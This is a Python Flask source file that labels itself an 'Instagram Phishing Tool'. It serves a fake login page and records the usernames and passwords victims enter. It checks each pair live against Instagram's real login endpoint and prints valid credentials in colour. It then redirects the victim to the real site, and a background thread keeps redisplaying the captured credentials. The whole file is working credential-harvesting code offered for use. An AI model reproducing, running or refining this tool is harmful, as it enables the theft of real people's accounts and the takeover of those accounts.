from flask import Flask, request, redirect, render_template, Response, make_response
import requests
import threading
import time
import os
import signal
import sys
from urllib.parse import unquote
from bs4 import BeautifulSoup

app = Flask(__name__)

# Global variables to store credentials
credentials = []
lock = threading.Lock()

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Store credentials
    with lock:
        credentials.append({'username': username, 'password': password, 'timestamp': time.time()})
    
    # Check if credentials are valid
    is_valid, session_info = check_credentials(username, password)

    if is_valid:
        print(f"\033[92m[+] SUCCESS: Valid credentials!\033[0m")
        print(f"\033[92m[+] Username: {username}\033[0m")
        print(f"\033[92m[+] Password: {password}\033[0m")
        
        # Create a response that redirects to Instagram
        response = make_response(redirect('https://www.instagram.com/'))
        
        # If we have session cookies, set them in the user's browser
        if session_info and 'cookies' in session_info:
            for cookie in session_info['cookies']:
                response.set_cookie(cookie['name'], cookie['value'])
        
        return response
    else:
        print(f"\033[91m[-] FAILED: Invalid credentials\033[0m")
        print(f"\033[91m[-] Username: {username}\033[0m")
        print(f"\033[91m[-] Password: {password}\033[0m")
        # Show error on fake page
        return render_template('login.html', error=True)

def check_credentials(username, password):
    try:
        # Create a session to persist cookies
        session = requests.Session()
        
        # Set headers to mimic a real browser
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        }
        session.headers.update(headers)

        # 1. Initial GET request to grab cookies
        response = session.get('https://www.instagram.com/')
        csrf_token = session.cookies.get_dict().get('csrftoken')

        # 2. GET request to the login page to get more dynamic data
        login_page_response = session.get('https://www.instagram.com/accounts/login/')
        
        # Extract required data from the login page
        soup = BeautifulSoup(login_page_response.content, 'html.parser')
        
        # Find the shared data script
        shared_data_script = soup.find('script', text=lambda t: t and 'window._sharedData' in t)
        shared_data = {}
        if shared_data_script:
            # Extract JSON from the script
            json_text = shared_data_script.string.split(' = ')[1].rstrip(';')
            shared_data = json.loads(json_text)

        # Get the rollout hash (required for the X-Instagram-AJAX header)
        rollout_hash = shared_data.get('rollout_hash', 'd7506f1c97a0')

        # 3. Prepare the POST request for login
        login_url = 'https://www.instagram.com/accounts/login/ajax/'
        
        # This is the crucial part - the password needs to be encrypted in a specific way
        enc_password = f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}'
        
        login_data = {
            'username': username,
            'enc_password': enc_password,
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'stopDeletion': 'false',
            'trustedDevice': 'false',
            'trusteSignal': 'false',
        }

        # Update headers for the POST request
        post_headers = {
            'X-CSRFToken': csrf_token,
            'X-Requested-With': 'XMLHttpRequest',
            'X-Instagram-AJAX': rollout_hash,
            'Referer': 'https://www.instagram.com/accounts/login/',
            'Origin': 'https://www.instagram.com',
        }
        session.headers.update(post_headers)

        # 4. Send the POST request
        response = session.post(login_url, data=login_data)
        
        # 5. Analyze the response
        response_json = response.json()
        
        # Debugging line (optional, but very helpful)
        print(f"\033[96m[DEBUG] Instagram Response: {response_json}\033[0m")
        
        # Check for success. 'authenticated' is the key.
        if response_json.get('authenticated'):
            return True
        # Sometimes the response is different, check for user object as well
        elif response_json.get('user'):
            return True
        else:
            return False

    except Exception as e:
        print(f"Error checking credentials: {e}")
        return False

def debug_response(response_data):
    print("\n\033[96m--- Instagram Response Debug ---\033[0m")
    for key, value in response_data.items():
        print(f"\033[96m{key}: {value}\033[0m")
    print("\033[96m-------------------------------\033[0m")

def display_credentials():
    while True:
        with lock:
            if credentials:
                print("\n\033[93m--- Captured Credentials ---\033[0m")
                for cred in credentials[-5:]:  # Show last 5 credentials
                    print(f"\033[93mUsername: {cred['username']}\033[0m")
                    print(f"\033[93mPassword: {cred['password']}\033[0m")
                    print(f"\033[93mTimestamp: {time.ctime(cred['timestamp'])}\033[0m")
                    print("\033[93m---------------------------\033[0m")
        time.sleep(5)

def signal_handler(sig, frame):
    print('\n\033[91mShutting down...\033[0m')
    sys.exit(0)

if __name__ == '__main__':
    # Start the credentials display thread
    cred_thread = threading.Thread(target=display_credentials)
    cred_thread.daemon = True
    cred_thread.start()
    
    # Register signal handler for Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    print("\033[92mInstagram Phishing Tool Started\033[0m")
    print("\033[92mAccess the tool at: http://localhost:8080\033[0m")
    print("\033[92mPress Ctrl+C to stop\033[0m")
    
    app.run(host='0.0.0.0', port=8080, debug=False)
